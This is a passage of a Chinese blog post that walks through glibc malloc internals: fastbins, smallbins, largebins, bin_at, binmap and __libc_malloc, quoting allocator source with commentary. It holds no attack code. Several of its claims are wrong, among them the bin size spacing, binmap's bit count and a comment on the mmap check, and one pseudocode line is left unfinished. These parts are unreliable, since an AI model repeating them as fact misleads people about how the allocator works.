<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MALLOC_ALIGNMENT=2*SIZE_SZ=16=0b 10000</span><br><span class="line">MALLOC_ALIGN_MASK=15=0b 1111</span><br><span class="line"> ~MALLOC_ALIGN_MASK=111...111 0000</span><br></pre></td></tr></table></figure>
<p>这个<code>global_max_fast</code>在<code>malloc_init_state</code>时期被初始化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (av == &amp;main_arena)</span><br><span class="line">  set_max_fast (DEFAULT_MXFAST);</span><br><span class="line">  </span><br><span class="line">#define DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</span><br></pre></td></tr></table></figure>
<p>对于<code>x64</code>平台,<code>SIZE_SZ=8</code>,那么<code>DEFAULT_MXFAST=128</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set_max_fast(128):</span><br><span class="line">	  global_max_fast = ((128 + 8) &amp; 111...111 0000))</span><br><span class="line">	  =0b10001000&amp;0b111...111 0000</span><br><span class="line">	  =0b10000000</span><br><span class="line">	  =128</span><br></pre></td></tr></table></figure>
<p>也就是说,<code>nb&lt;=128</code>才可能在fastbin中取堆块</p>
<h5 id="fastbin_index">fastbin_index</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz)  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure>
<p>在x64平台上,<code>SIZE_SZ=8</code>,而在x86平台上<code>SIZE_SZ=4</code></p>
<p>如果在x64平台上,则将sz右移4位,相当于除以16,然后-2,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index(sz)</span><br><span class="line">	=sz &gt;&gt; 4 - 2</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>sz</th>
<th>fastbin_index(sz) on x64</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>[0b100000,0b110000)=[32,48)</code></td>
<td>0</td>
</tr>
<tr>
<td><code>[0b110000,0b1000000)=[48,64)</code></td>
<td>1</td>
</tr>
<tr>
<td><code>[0b1000000,0b1010000)=[64,80)</code></td>
<td>2</td>
</tr>
</tbody>
</table>
<p>比如用户期望分配0x10大小的空间,那么实际上的堆块大小是32字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index(0b100000)</span><br><span class="line">	=0b100000&gt;&gt;4 -2</span><br><span class="line">	=0b10-2</span><br><span class="line">	=0</span><br></pre></td></tr></table></figure>
<h5 id="fastbinidx">fastbin[idx]</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>fastbins结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct malloc_chunk *mfastbinptr;</span><br><span class="line">...</span><br><span class="line">struct malloc_state&#123;</span><br><span class="line">	...</span><br><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>fastbins是一个链栈,先释放的堆块也会先被再次分配</p>
</blockquote>
<p>也就是说<code>mfastbinptr *fb = &amp;fastbin (av, idx);</code></p>
<p>这栈中的指针变量fb指向桶子头的地址,桶子头指向该桶子中的第一个堆块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">A[&quot;fastbin[x] @malloc_state&quot;]</span><br><span class="line">a2[&quot;1st chunk @heap&quot;]</span><br><span class="line">a1[&quot;2nd chunk @heap&quot;]</span><br><span class="line">a0[&quot;3rd chunk @heap&quot;]</span><br><span class="line">fb[&quot;fb句柄 @stack&quot;]----&gt;A--fd--&gt;a2--fd--&gt;a1--fd--&gt;a0</span><br></pre></td></tr></table></figure>
<h5
id="catomic_compare_and_exchange_val_acq-fb-victim-fd-victim">catomic_compare_and_exchange_val_acq
(fb, victim-&gt;fd, victim)</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> catomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  atomic_compare_and_exchange_val_acq (mem, newval, oldval)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> atomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  (&#123; __typeof (mem) __gmemp = (mem);				      \</span></span><br><span class="line"><span class="meta">     __typeof (*mem) __gret = *__gmemp;				      \</span></span><br><span class="line"><span class="meta">     __typeof (*mem) __gnewval = (newval);			      \</span></span><br><span class="line"><span class="meta">								      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> (__gret == (oldval))					      \</span></span><br><span class="line"><span class="meta">       *__gmemp = __gnewval;					      \</span></span><br><span class="line"><span class="meta">     __gret; &#125;)</span></span><br></pre></td></tr></table></figure>
<p>这个宏的作用是,</p>
<p>原本mem指向的是oldval,现在将oldval作为返回值,然后将men指向newval</p>
<p>放在原文中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim = pp;<span class="comment">//首先执行一次,如果第一次victim为空,说明这个桶子就是空的,也就不能用fastbin进行分配</span></span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">while</span> (</span><br><span class="line">		(pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)</span><br><span class="line">      )!= victim</span><br><span class="line">    <span class="comment">//victim指向链栈顶堆块,把他取下来,把原来的次顶堆块,也就是victim的后继堆块,挂到fb指针上,返回值pp是victim</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>fb这个桶子头原本是指向victim这个堆块的,</p>
<p>现在要让fb指向victim的后继堆块,然后返回victim给pp</p>
<p>显然pp必然等于victim,也就是顶多拿出堆顶来,while就结束了,while只会执行一次</p>
<p>至于为啥要这样写呢?压行</p>
<h5 id="check_remalloced_chunkapn">check_remalloced_chunk(A,P,N)</h5>
<p>对本应该属于A分配区的大小位S的堆块P进行检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_check_remalloced_chunk</span> <span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line"><span class="comment">//提取p堆块结构体中存放的size,由于低三位是标志复用,现在需要将其盖住</span></span><br><span class="line">  <span class="keyword">if</span> (!chunk_is_mmapped (p))<span class="comment">//如果是mmap分配的堆块</span></span><br><span class="line">      <span class="comment">//如果是mmap分配的堆块,则</span></span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));<span class="comment">//首先检查给定的av是否是预期的p的所属分配区</span></span><br><span class="line">      <span class="keyword">if</span> (chunk_non_main_arena (p))<span class="comment">//如果p不是主分配区的</span></span><br><span class="line">        assert (av != &amp;main_arena);<span class="comment">//检查av是不是主分配区</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        assert (av == &amp;main_arena);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);<span class="comment">//检查本堆块是否正在使用</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Legal size ... */</span></span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);<span class="comment">//检查sz大小是否对齐</span></span><br><span class="line">  assert ((<span class="type">unsigned</span> <span class="type">long</span>) (sz) &gt;= MINSIZE);<span class="comment">//检查sz大小是否大于最小分配大小</span></span><br><span class="line">  <span class="comment">/* ... and alignment */</span></span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));<span class="comment">//检查p指向的地址是否对齐</span></span><br><span class="line">  <span class="comment">/* chunk is less than MINSIZE more than request */</span></span><br><span class="line">  assert ((<span class="type">long</span>) (sz) - (<span class="type">long</span>) (s) &gt;= <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="type">long</span>) (sz) - (<span class="type">long</span>) (s + MINSIZE) &lt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="unsortedbins">unsortedbins</h4>
<p><code>smallbins</code>和<code>unsortedbins</code>中堆块的连接方式相同,都是双向链表</p>
<p>两者不同的是,<code>unsortedbin</code>中堆块可以大小各异,但是<code>smallbin</code>中一个桶子里的堆块必须相同</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/smallbin2.png"
alt="smallbin2" />
<figcaption aria-hidden="true">smallbin2</figcaption>
</figure>
<p><code>unsortedbin</code>的双向链表没有长短限制,采用头插法</p>
<h5 id="unsorted_chunksm-bin_atm-1">unsorted_chunks(M) (bin_at(M,
1))</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br></pre></td></tr></table></figure>
<p>取unsortedbin桶子头</p>
<h4 id="smallbins">smallbins</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define NSMALLBINS 64</span><br></pre></td></tr></table></figure>
<p>bins的下标是从0到253,其中每个桶子占用两个bins,分别作为fd和bk指针</p>
<p>smallbins占用64个桶子,</p>
<p>其中第1个桶子是unsortedbin,第2个到第63个桶子是smallbins</p>
<p>从第64个及以后的桶子就是largebins</p>
<h5 id="next_bin">next_bin</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_bin(b) ((mbinptr)((char *)(b) + (sizeof(mchunkptr) &lt;&lt; 1)))</span></span><br></pre></td></tr></table></figure>
<p>下一个bin就是<strong>mchunkptr指针</strong>的大小,也就是8个字节(在x64上)</p>
<p>左移一位也就是乘以2,因为每个Bin占用两个bin,分别作为fd和bk指针</p>
<h5 id="in_smallbin_range">in_smallbin_range</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#define in_smallbin_range(sz)  \</span><br><span class="line">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><span class="line">  </span><br><span class="line">#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><span class="line"></span><br><span class="line">#define NBINS             128</span><br><span class="line">#define NSMALLBINS         64</span><br><span class="line">#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="line">#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="line"></span><br><span class="line">///MALLOC_ALIGNMENT=16</span><br><span class="line">SMALLBIN_CORRECTION=FALSE=0</span><br><span class="line">MIN_LARGE_SIZE=(64-0)*16=1024</span><br></pre></td></tr></table></figure>
<p>smallbins有(64-2=62)个桶子,最大管理的堆块为1023Bytes</p>
<p>再大一个字节都得放到largebin中</p>
<p>也就是说fastbins管理的堆块大小也在smallbin范围内,也就是说,<strong>fastbin相当于前部分比较小的smallbins的缓存</strong></p>
<h5 id="smallbin_index">smallbin_index</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))+ SMALLBIN_CORRECTION)</span></span><br><span class="line">	SMALLBIN_WIDTH=MALLOC_ALIGNMENT=<span class="number">16</span>字节</span><br><span class="line">    SMALLBIN_CORRECTION=<span class="number">0</span></span><br><span class="line">    smallbin_index(sz)=(sz&gt;&gt;<span class="number">4</span>)+<span class="number">0</span>=sz/<span class="number">16</span></span><br></pre></td></tr></table></figure>
<p>这里参数sz是将请求大小换算成对应堆块整体大小之后的值,也就是包括了元数据</p>
<p>最小是0x20(元数据prev_size和size占用0x10,剩下的0x10是最小分配要求)</p>
<table>
<thead>
<tr>
<th>堆块大小(sz)</th>
<th>index</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>unsortedbin</strong></td>
<td>1</td>
</tr>
<tr>
<td><strong>smallbins</strong></td>
<td>[1,63]</td>
</tr>
<tr>
<td><code>[0x20,0x30)</code></td>
<td>2</td>
</tr>
<tr>
<td><code>[0x30,0x40)</code></td>
<td>3</td>
</tr>
<tr>
<td>....</td>
<td></td>
</tr>
<tr>
<td><code>[0x3f0,0x400)</code></td>
<td>63</td>
</tr>
<tr>
<td>&gt;0x400</td>
<td>largebins</td>
</tr>
</tbody>
</table>
<h5 id="bin_at">bin_at</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr)(((char *)&amp;((m)-&gt;bins[((i)-1) * 2])) - offsetof(struct malloc_chunk, fd))</span></span><br><span class="line">	<span class="comment">//(m)-&gt;bins[((i)-1) * 2]-16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offsetof(s,m) ((size_t)&amp;(((s*)0)-&gt;m))</span></span><br></pre></td></tr></table></figure>
<p>这里m是malloc_state结构,i是使用smallbin_index宏计算出的堆块在smallbin中的下标,i从2开始,因为bins[0]和bins[1]是unsortedbin的地盘</p>
<p><code>m-&gt;bins[2*(i-1)]</code>指向的是下标为(2*(i-1))的桶子的桶子头,减去<code>fd</code>成员在一个堆块中的偏移量,得到的是该桶子头基址往前16字节的内存地址</p>
<p>显然这个地方是未知的,这是为啥呢?</p>
<p>最后将该地址又交给一个mbinptr也就是malloc_chunk*指针保管</p>
<p>那么此时,新指针+16的位置刚好是修正后的fd</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/9c28ec87e40a4ea615599a26bafa58c.png"
alt="9c28ec87e40a4ea615599a26bafa58c" />
<figcaption
aria-hidden="true">9c28ec87e40a4ea615599a26bafa58c</figcaption>
</figure>
<p>而每个桶子头节点虽然也是malloc_chunk类型,但是只需要fd和bk两个指针,其他成员不需要</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/smallbinhead.png"
alt="smallbinhead" />
<figcaption aria-hidden="true">smallbinhead</figcaption>
</figure>
<h5 id="set_inuse_bit_at_offset">set_inuse_bit_at_offset</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse_bit_at_offset(p, s) \</span></span><br><span class="line"><span class="meta">  (((mchunkptr)(((char *)(p)) + (s)))-&gt;size |= PREV_INUSE)</span></span><br></pre></td></tr></table></figure>
<p>将size字段的flag位设置上PREV_INUSE=1,表示前一个物理相邻块正在被占用</p>
<h5 id="do_check_malloced_chunk">do_check_malloced_chunk</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> check_malloced_chunk(A, P, N) do_check_malloced_chunk(A, P, N)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_check_malloced_chunk</span><span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span><br><span class="line">&#123;</span><br><span class="line">  do_check_remalloced_chunk(av, p, s);</span><br><span class="line">  assert(prev_inuse(p));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="largebins">largebins</h4>
<p>smallbins中的每两个相邻的桶子,其中堆块的大小相差0x16字节(在x64上)</p>
<p>Bin Index就是bin_at的计算结果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">实际上largebins和smallbins可以看成一个整体,前<span class="number">64</span>个桶子是smallbins</span><br><span class="line">    前<span class="number">64</span>个桶子相邻两个桶子之间大小差<span class="number">8</span>字节</span><br><span class="line">   	然后<span class="number">32</span>个桶子相邻两个桶子之间大小差<span class="number">64</span>字节</span><br><span class="line">    然后<span class="number">16</span>个桶子相邻两个桶子之间大小差<span class="number">512</span>字节</span><br><span class="line">    ...</span><br><span class="line">	<span class="number">64</span> bins of size       <span class="number">8</span></span><br><span class="line">    <span class="number">32</span> bins of size      <span class="number">64</span></span><br><span class="line">    <span class="number">16</span> bins of size     <span class="number">512</span></span><br><span class="line">     <span class="number">8</span> bins of size    <span class="number">4096</span></span><br><span class="line">     <span class="number">4</span> bins of size   <span class="number">32768</span></span><br><span class="line">     <span class="number">2</span> bins of size  <span class="number">262144</span></span><br><span class="line">     <span class="number">1</span> bin  of size what<span class="number">&#x27;</span>s left</span><br></pre></td></tr></table></figure>
<h5 id="largebin_range">largebin_range</h5>
<p>malloc函数在分配时,超过smallbin_range大小的堆块才可能被放到largebin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz) \</span></span><br><span class="line"><span class="meta">  ((unsigned long)(sz) &lt; (unsigned long)MIN_LARGE_SIZE)</span></span><br></pre></td></tr></table></figure>
<p>在x64上,MIN_LARGE_SIZE=1024</p>
<p>也就是说,大于等于1024的堆块才可能进入largebin</p>
<h5 id="largebin_index">largebin_index</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz)                              \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8             ? largebin_index_64(sz)     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big(sz) \ <span class="comment">//size_sz!=8并且对齐是16位,调用largebin_index_32_big</span></span></span><br><span class="line">                            : largebin_index_32(sz))		<span class="comment">//size_sz!=8并且对齐是8位,调用largebin_index_32</span></span><br><span class="line">x64上SIZE_SZ=<span class="number">8</span>(一个指针的大小),因此调用largebin_index_64(sz) 这个宏</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                                                                                            \</span></span><br><span class="line"><span class="meta">  (((((unsigned long)(sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ? 48 + (((unsigned long)(sz)) &gt;</span>&gt; 6) : ((((unsigned long)(sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ? 91 + (((unsigned long)(sz)) &gt;</span>&gt; 9)   \</span></span><br><span class="line"><span class="meta">                                                                          : ((((unsigned long)(sz)) &gt;&gt; 12) <span class="string">&lt;= 10)  ? 110 + (((unsigned long)(sz)) &gt;</span>&gt; 12) \</span></span><br><span class="line"><span class="meta">                                                                          : ((((unsigned long)(sz)) &gt;&gt; 15) <span class="string">&lt;= 4)   ? 119 + (((unsigned long)(sz)) &gt;</span>&gt; 15) \</span></span><br><span class="line"><span class="meta">                                                                          : ((((unsigned long)(sz)) &gt;&gt; 18) <span class="string">&lt;= 2)   ? 124 + (((unsigned long)(sz)) &gt;</span>&gt; 18) \</span></span><br><span class="line"><span class="meta">                                                                                                                   : 126)</span></span><br></pre></td></tr></table></figure>
<p>这里的参数sz是包括元数据的整个堆块大小</p>
<p>又落在largebin范围内的堆块,最小是1024字节,因此sz右移6位后,最小是16,那么第一组从16到48,堆块的大小也就是从1024到3072</p>
<p>这些堆块对应的桶下标计算方式为,将其大小右移6位然后加上48,</p>
<p>也就是说,一个桶子中的堆块一样大,同一组内相邻两个桶子中堆块相差64B</p>
<table>
<thead>
<tr>
<th>largebins堆块大小</th>
<th>下标</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>[1024,1087)</td>
<td>64</td>
<td></td>
</tr>
<tr>
<td>[1088,1151)</td>
<td>65</td>
<td></td>
</tr>
<tr>
<td>...</td>
<td></td>
<td></td>
</tr>
<tr>
<td>[3072,3135)</td>
<td>96</td>
<td>这块儿到底塞到哪里我也不知道</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">64</span> bins of size       <span class="number">8</span></span><br><span class="line">   <span class="number">32</span> bins of size      <span class="number">64</span></span><br><span class="line">   <span class="number">16</span> bins of size     <span class="number">512</span></span><br><span class="line">    <span class="number">8</span> bins of size    <span class="number">4096</span></span><br><span class="line">    <span class="number">4</span> bins of size   <span class="number">32768</span></span><br><span class="line">    <span class="number">2</span> bins of size  <span class="number">262144</span></span><br><span class="line">    <span class="number">1</span> bin  of size what<span class="number">&#x27;</span>s left</span><br></pre></td></tr></table></figure>
<p>整个largebin中有6组桶子,第一组占用32个Bins,相邻两个桶子之间的堆块相差64B</p>
<p>第二组占用16个Bins,相邻两个桶子之间的堆块相差16B</p>
<p>...</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(sz/64&lt;=48)&#123;</span><br><span class="line">	return 48+sz/64</span><br><span class="line">&#125;else if(sz/512&lt;=20)&#123;</span><br><span class="line">	return 91+sz/512</span><br><span class="line">&#125;else if(sz/4096&lt;=10)&#123;</span><br><span class="line">	return 110+sz/4096</span><br><span class="line">&#125;else if(sz/)</span><br></pre></td></tr></table></figure>
<h4 id="binmap">binmap</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS 128</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSHIFT 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITSPERMAP (1U &lt;&lt; BINMAPSHIFT)  </span></span><br><span class="line">	BITSPERMAP=<span class="number">32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSIZE (NBINS / BITSPERMAP)</span></span><br><span class="line">	BINMAPSIZE=<span class="number">128</span>/<span class="number">32</span>=<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> binmap[<span class="number">4</span>];</span><br></pre></td></tr></table></figure>
<p>binmap是一个4个int的数组,共32位,不管是x64还是x86都是32位,用于标记32个largebin中是否有空闲的堆块</p>
<p>用于加快largebin中分配堆块时的最适寻找工作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> idx2block(i) ((i) &gt;&gt; BINMAPSHIFT)</span></span><br></pre></td></tr></table></figure>
<p>i是largebins下标,右移5位也就是除以32计算得到属于i下标的桶子属于map[0]还是map[1],map[2],map[3]哪一个管理</p>
<p>一个block也就是8个桶子归一个map管</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br></pre></td></tr></table></figure>
<p>计算i下标的largebins桶子属于其对应block的哪一位管</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define mark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))			//改,标记i下标的largebins有空闲堆块</span><br><span class="line">#define unmark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] &amp;= ~(idx2bit(i)))		//删</span><br><span class="line">#define get_binmap(m, i) ((m)-&gt;binmap[idx2block(i)] &amp; idx2bit(i))			//查</span><br></pre></td></tr></table></figure>
<h2 id="algorithm">algorithm</h2>
<h3 id="malloc">malloc</h3>
<p>用户空间的malloc函数,实际上调用的是<code>__libc_malloc@glibc</code>,别名罢了</p>
<h4 id="libc_malloc">__libc_malloc</h4>
<p>用户程序调用的malloc函数,实际上调用的是<code>__libc_malloc</code></p>
<p>在<code>glibc/malloc/malloc.c</code>中有这么一个<code>alias</code>声明</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strong_alias (__libc_malloc, __malloc) strong_alias (__libc_malloc, <span class="built_in">malloc</span>)</span><br></pre></td></tr></table></figure>
<p>而<code>__libc_malloc</code>实际上做的事情就两句话</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"><span class="keyword">return</span> victim;</span><br></pre></td></tr></table></figure>
<p>其他内容都是多线程上下锁,各种检查,编译优化了</p>
